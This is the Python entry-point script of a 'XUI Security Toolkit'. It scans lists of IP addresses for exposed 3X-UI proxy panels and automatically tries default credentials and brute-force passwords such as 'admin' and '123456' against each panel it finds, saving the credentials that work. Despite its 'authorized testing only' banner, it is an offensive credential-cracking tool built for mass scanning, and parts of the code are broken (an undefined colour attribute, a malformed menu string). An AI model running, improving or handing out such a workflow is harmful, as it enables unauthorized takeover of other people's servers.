#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║          🔥 XUI SECURITY TOOLKIT v3.1 - ALL-IN-ONE 🔥                       ║
║           Complete 3X-UI Panel Security Testing Suite                        ║
║                                                                              ║
║  This is the MAIN entry point that combines:                                ║
║  ✓ XUI Scanner Pro - Find 3X-UI panels                                      ║
║  ✓ XUI Cracker Enhanced - Crack panel credentials                           ║
║  ✓ One-click workflow: Scan → Export → Crack                                 ║
║                                                                              ║
║  Usage:                                                                      ║
║    python3 toolkit.py              # Interactive mode                       ║
║    python3 toolkit.py --full-auto  # Full automatic scan + crack             ║
║    python3 toolkit.py --scan-only  # Just scan for panels                   ║
║    python3 toolkit.py --crack-only # Just crack existing list               ║
║                                                                              ║
║  Author: @mansorkorea84                                                      ║
║  License: MIT - Educational Purposes Only                                    ║
║  Version: 3.1 (Enhanced)                                                     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

⚠️  SECURITY WARNING: This tool is for AUTHORIZED security testing only!
     Unauthorized access to systems is illegal and unethical.
"""

import os
import sys
import argparse
import subprocess
import time  # FIXED: Missing import that caused NameError
from datetime import datetime

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ==================== COLORS ====================
class C:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    WHITE = '\033[97m'
    MAGENTA = '\033[35m'
    ORANGE = '\033[38;5;208m'
    END = '\033[0m'
    BG_GREEN = '\033[42m'
    BG_BLUE = '\033[44m'
    DIM = '\033[2m'

# ==================== BANNER ====================
def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    banner = f"""
{C.RED}╔══════════════════════════════════════════════════════════════════════════════╗
{C.RED}║                                                                              ║
{C.RED}║{C.CYAN}   ███████╗ █████╗ ██╗   ██╗███████╗ ██████╗  ██████╗ ██████╗  {C.RED}║
{C.RED}║{C.CYAN}   ██╔════╝██╔══██╗██║   ██║██╔════╝██╔═══██╗██╔═══██╗██╔══██╗ {C.RED}║
{C.RED}║{C.CYAN}   █████╗  ███████║██║   ██║█████╗  ██║   ██║██║   ██║██║  ██║ {C.RED}║
{C.RED}║{C.CYAN}   ██╔══╝  ██╔══██║██║   ██║██╔══╝  ██║   ██║██║   ██║██║  ██║ {C.RED}║
{C.RED}║{C.CYAN}   ███████╗██║  ██║╚██████╔╝███████║╚██████╔╝╚██████╔╝██████╔╝ {C.RED}║
{C.RED}║{C.CYAN}   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝  {C.RED}║
{C.RED}║                                                                              ║
{C.RED}╠══════════════════════════════════════════════════════════════════════════════╣
{C.RED}║{C.GREEN}       🔥 XUI SECURITY TOOLKIT v3.1 - ALL-IN-ONE SUITE 🔥                {C.RED}║
{C.RED}║{C.YELLOW}              Scanner + Cracker + Exploiter - Complete                    {C.RED}║
{C.RED}║{C.MAGENTA}                         Author: @mansorkorea84                      {C.RED}║
{C.RED}║{C.CYAN}                               [{now}]                              {C.RED}║
{C.RED}╚══════════════════════════════════════════════════════════════════════════════╝{C.END}
"""
    print(banner)

# ==================== MENU ====================
def print_main_menu():
    menu = f"""
{C.CYAN}┌─────────────────────────────────────────────────────────────────────────────┐
{C.CYAN}│{C.YELLOW}                    🔰 MAIN MENU - SELECT TOOL 🔰                       {C.CYAN}│
{C.CYAN}├─────────────────────────────────────────────────────────────────────────────┤
{C.CYAN}│                                                                             │
{C.CYAN}│{C.GREEN}  [1]{C.WHITE} 📡 XUI Scanner Pro        {C.DIM}- Find 3X-UI panels           {C.CYAN}│
{C.CYAN}│{C.GREEN}  [2]{C.WHITE} 🔓 XUI Cracker Enhanced    {C.DIM}- Crack panel credentials      {C.CYAN}│
{C.CYAN}│                                                                             │
{C.CYAN}│{C.MAGENTA}  [3]{C.WHITE} ⚡ FULL AUTO WORKFLOW   {C.DIM}- Scan → Export → Crack!     {C.CYAN}│
{C.CYAN}│{C.MAGENTA}  [4]{C.WHITE} 📋 View Found Panels     {C.DIM}- Show previous results       {C.CYAN}│
{C.CYAN}│                                                                             │
{C.CYAN}├─────────────────────────────────────────────────────────────────────────────┤
{C.CYAN}│{C.ORANGE}  [5]{C.WHITE} ⚙️  Settings                                                             {C.CYAN}│
{C.CYAN}│{C.YELLOW}  [0] Exit                                                                     {C.CYAN}│
{C.CYAN}└─────────────────────────────────────────────────────────────────────────────┘{C.END}

{C.CYAN}[?] Select Tool: {C.END}", end=""
    return input()

# ==================== FUNCTIONS ====================
def run_scanner():
    """Run XUI Scanner Pro"""
    print(f"\n{C.CYAN}[*] Launching XUI Scanner Pro...{C.END}\n")
    time.sleep(1)
    
    try:
        from xui_scanner import XUIScannerPro
        scanner = XUIScannerPro()
        scanner.run_interactive()
    except ImportError:
        print(f"{C.RED}[-] Error importing scanner. Running as module...{C.END}")
        subprocess.run([sys.executable, "xui_scanner.py"])
    except Exception as e:
        print(f"{C.RED}[-] Error: {e}{C.END}")

def run_cracker():
    """Run XUI Cracker Enhanced"""
    print(f"\n{C.CYAN}[*] Launching XUI Cracker Enhanced...{C.END}\n")
    time.sleep(1)
    
    try:
        from xui_cracker import XUICrackerApp
        app = XUICrackerApp()
        app.run()
    except ImportError:
        print(f"{C.RED}[-] Error importing cracker. Running as module...{C.END}")
        subprocess.run([sys.executable, "xui_cracker.py"])
    except Exception as e:
        print(f"{C.RED}[-] Error: {e}{C.END}")

def run_full_auto():
    """Run full automatic workflow - enhanced"""
    print_banner()
    print(f"\n{C.MAGENTA}[*] ⚡ FULL AUTO WORKFLOW ⚡{C.END}")
    print(f"{C.CYAN}[*] This will:{C.END}")
    print(f"    1. Scan IPs to find 3X-UI panels (Multiple Ports)")
    print(f"    2. Save found panels to file")
    print(f"    3. Run XUI Cracker on found panels")
    print(f"    4. Generate complete report\n")
    
    # Get IP source
    ip_source = input(f"{C.CYAN}[?] {C.WHITE}IP list file (or press Enter for sample_ips_2053.txt): {C.END}").strip()
    if not ip_source:
        ip_source = "sample_ips_2053.txt"
        
    if not os.path.exists(ip_source):
        print(f"{C.RED}[-] File not found: {ip_source}{C.END}")
        return
        
    threads_input = input(f"{C.CYAN}[?] {C.WHITE}Scanner threads (default 50): {C.END}").strip()
    try:
        threads = int(threads_input) if threads_input else 50
    except (ValueError, TypeError):
        threads = 50
        
    crack_threads_input = input(f"{C.CYAN}[?] {C.WHITE}Cracker threads (default 20): {C.END}").strip()
    try:
        crack_threads = int(crack_threads_input) if crack_threads_input else 20
    except (ValueError, TypeError):
        crack_threads = 20
        
    print(f"\n{C.YELLOW}[*] Phase 1/3: Scanning for 3X-UI panels...{C.END}\n")
    
    # Run scanner
    try:
        from xui_scanner import XUIScannerPro, load_ip_list
        scanner = XUIScannerPro()
        ips = load_ip_list(ip_source)
        
        if not ips:
            print(f"{C.RED}[-] No IPs loaded!{C.END}")
            return
            
        # Scan multiple ports now
        found_panels = scanner.quick_scan(ips, ports=[2053, 443, 8443, 2083], threads=threads)
        
        if not found_panels:
            print(f"\n{C.YELLOW}[!] No 3X-UI panels found.{C.END}")
            return
            
        # Save panels for cracker
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        panels_file = f"found_panels_{timestamp}.txt"
        with open(panels_file, 'w') as f:
            for panel in found_panels:
                f.write(f"{panel.for_cracker}\n")
                
        print(f"\n{C.GREEN}[+] Found {len(found_panels)} panels! Saved to {panels_file}{C.END}")
        print(f"\n{C.YELLOW}[*] Phase 2/3: Running credential attack...{C.END}\n")
        time.sleep(2)
        
        # Run cracker
        from xui_cracker import XUICrackerApp
        app = XUICrackerApp()
        
        targets = app.load_targets(panels_file)
        usernames = ['admin', 'root', 'administrator']
        passwords = ['admin', 'password', '123456', 'admin123', '', '3xui']
        
        default_found = app.default_checker.check_targets(targets, threads=crack_threads)
        app.credentials.extend(default_found)
        
        found_urls = {c.target_url for c in default_found}
        remaining = [t for t in targets if t.full_url not in found_urls]
        
        if remaining:
            print(f"\n{C.YELLOW}[*] Phase 3/3: Brute force on remaining targets...{C.END}")
            brute_found = app.engine.run_attack(
                remaining, 
                ['admin'], 
                ['admin', 'password', '123456', 'admin123', '3xui', ''],
                threads=crack_threads,
                mode="auto"
            )
            app.credentials.extend(brute_found)
            
        print(f"\n{C.BG_GREEN}{C.BLACK}")
        print("  ╔══════════════════════════════════════════════════════════════╗")
        print("  ║          🔥 FULL AUTO WORKFLOW COMPLETE! 🔥                  ║")
        print("  ╠══════════════════════════════════════════════════════════════╣")
        print(f"  ║  Panels Scanned : {len(found_panels):<48}║")
        print(f"  ║  Credentials    : {len(app.credentials):<48}║")
        print("  ╚══════════════════════════════════════════════════════════════╝")
        print(C.END)
        
        if app.credentials:
            from xui_cracker import save_results
            save_results(app.credentials, f"auto_results_{timestamp}.json")
            
    except ImportError as e:
        print(f"{C.RED}[-] Import error: {e}{C.END}")
        print(f"{C.YELLOW}[*] Make sure xui_scanner.py and xui_cracker.py are in the same directory{C.END}")
    except Exception as e:
        print(f"{C.RED}[-] Error: {e}{C.END}")
        import traceback
        traceback.print_exc()

def view_panels():
    """View previously found panels - enhanced"""
    print(f"\n{C.CYAN}[*] Looking for saved panel lists...{C.END}\n")
    
    files = []
    for f in os.listdir('.'):
        if f.startswith('xui_panels_') and f.endswith('.txt'):
            files.append(f)
        elif f.startswith('found_panels_') and f.endswith('.txt'):
            files.append(f)
            
    if not files:
        print(f"{C.YELLOW}[!] No saved panel lists found.{C.END}")
        print(f"{C.CYAN}[*] Run the scanner first to find some panels!{C.END}")
        return
        
    print(f"{C.GREEN}[+] Found {len(files)} saved panel list(s):{C.END}\n")
    
    for i, f in enumerate(files, 1):
        mtime = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M')
        try:
            with open(f, 'r') as file:
                lines = sum(1 for line in file if line.strip() and not line.startswith('#'))
        except (IOError, OSError):
            lines = 0
        print(f"  {C.GREEN}[{i}]{C.WHITE} {f:<40} {C.CYAN}({lines} panels, {mtime}){C.END}")
        
    print()
    choice = input(f"{C.CYAN}[?] {C.WHITE}Select file to view (or press Enter to go back): {C.END}").strip()
    
    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(files):
            filename = files[idx]
            print(f"\n{C.YELLOW}[*] Contents of {filename}:{C.END}\n")
            try:
                with open(filename, 'r') as f:
                    content = f.read()
                print(content)
                
                use_for_crack = input(f"\n{C.CYAN}[?] {C.WHITE}Use this file for cracking? (y/n): {C.END}").strip().lower()
                if use_for_crack == 'y':
                    print(f"\n{C.GREEN}[+] Opening XUI Cracker with this file...{C.END}")
                    time.sleep(1)
                    run_cracker()
            except (IOError, OSError) as e:
                print(f"{C.RED}[-] Error reading file: {e}{C.END}")

def show_settings():
    """Show settings/info - enhanced"""
    print_banner()
    
    info = f"""
{C.CYAN}┌─────────────────────────────────────────────────────────────────────────────┐
{C.CYAN}│{C.YELLOW}                          ⚙️  SETTINGS ⚙️                             {C.CYAN}│
{C.CYAN}├─────────────────────────────────────────────────────────────────────────────┤
{C.CYAN}│                                                                             │
{C.CYAN}│{C.WHITE}  Toolkit Version     : {C.GREEN}v3.1{C.WHITE} (Patched & Enhanced)                   {C.CYAN}│
{C.CYAN}│{C.WHITE}  Scanner Version     : {C.GREEN}v2.0{C.WHITE} (XUI Scanner Pro)                       {C.CYAN}│
{C.CYAN}│{C.WHITE}  Cracker Version     : {C.GREEN}v3.1{C.WHITE} (XUI Cracker Enhanced)                  {C.CYAN}│
{C.CYAN}│                                                                             │
{C.CYAN}│{C.WHITE}  Default Scan Ports : {C.YELLOW}2053, 443, 8443, 2083, 81, 8080{C.WHITE}             {C.CYAN}│
{C.CYAN}│{C.WHITE}  Max Threads        : {C.YELLOW}100{C.WHITE}                                        {C.CYAN}│
{C.CYAN}│                                                                             │
{C.CYAN}│{C.WHITE}  Author             : {C.MAGENTA}@mansorkorea84{C.WHITE}                              {C.CYAN}│
{C.CYAN}│{C.WHITE}  License            : {C.YELLOW}MIT (Educational Only){C.WHITE}                     {C.CYAN}│
{C.CYAN}│                                                                             │
{C.CYAN}│{C.WHITE}  Files:                                                                     {C.CYAN}│
{C.CYAN}│{C.WHITE}    - toolkit.py         (This file - Main entry){C.WHITE}                    {C.CYAN}│
{C.CYAN}│{C.WHITE}    - xui_scanner.py     (Panel detector/scanner){C.WHITE}                   {C.CYAN}│
{C.CYAN}│{C.WHITE}    - xui_cracker.py     (Credential cracker){C.WHITE}                       {C.CYAN}│
{C.CYAN}│{C.WHITE}    - sample_ips_2053.txt (Sample target list){C.WHITE}                   {C.CYAN}│
{C.CYAN}│                                                                             │
{C.CYAN}├─────────────────────────────────────────────────────────────────────────────┤
{C.CYAN}│{C.YELLOW}  Output Files Generated:                                                 {C.CYAN}│
{C.CYAN}│{C.WHITE}    - xui_scan_*.json      (Scan results){C.WHITE}                          {C.CYAN}│
{C.CYAN}│{C.WHITE}    - xui_panels_*.txt     (Panel list for cracker){C.WHITE}               {C.CYAN}│
{C.CYAN}│{C.WHITE}    - xui_good.txt         (Found credentials){C.WHITE}                    {C.CYAN}│
{C.CYAN}│{C.WHITE}    - xui_results.json     (Complete results){C.WHITE}                     {C.CYAN}│
{C.CYAN}│                                                                             │
{C.CYAN}└─────────────────────────────────────────────────────────────────────────────┘{C.END}
"""
    print(info)
    input(f"\n{C.CYAN}[?] Press Enter to go back...{C.END}")

# ==================== MAIN ====================
def main():
    """Main entry point - enhanced"""
    parser = argparse.ArgumentParser(
        description='XUI Security Toolkit v3.1 - All-in-One 3X-UI Security Suite',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 toolkit.py                    # Interactive mode (menu)
  python3 toolkit.py --full-auto        # Full auto scan + crack
  python3 toolkit.py --scan ips.txt     # Just scan
  python3 toolkit.py --crack panels.txt # Just crack
        """
    )
    
    parser.add_argument('--full-auto', '-a', help='Full automatic workflow: scan + crack')
    parser.add_argument('--scan', '-s', help='Run scanner only')
    parser.add_argument('--crack', '-c', help='Run cracker only')
    parser.add_argument('--list', '-l', action='store_true', help='List found panels')
    
    args = parser.parse_args()
    
    if args.full_auto:
        sys.argv = ['xui_scanner.py', '--scan', args.full_auto]
        run_full_auto()
    elif args.scan:
        sys.argv = ['xui_scanner.py', '--scan', args.scan]
        run_scanner()
    elif args.crack:
        sys.argv = ['xui_cracker.py', '--mode', 'auto', '--targets', args.crack]
        run_cracker()
    elif args.list:
        view_panels()
    else:
        # Interactive mode
        while True:
            print_banner()
            choice = print_main_menu()
            
            if choice == '0':
                print(f"\n{C.CYAN}[*] Thanks for using XUI Security Toolkit! 👋{C.END}")
                print(f"{C.CYAN}[*] GitHub: https://github.com/mansorkorea84/XUI_CRACKER{C.END}\n")
                break
            elif choice == '1':
                run_scanner()
            elif choice == '2':
                run_cracker()
            elif choice == '3':
                run_full_auto()
            elif choice == '4':
                view_panels()
            elif choice == '5':
                show_settings()
            else:
                print(f"{C.RED}[-] Invalid choice!{C.END}")
                time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{C.YELLOW}[!] Exited by user. Goodbye! 👋{C.END}")
    except Exception as e:
        print(f"\n{C.RED}[-] Fatal error: {e}{C.END}")
        import traceback
        traceback.print_exc()
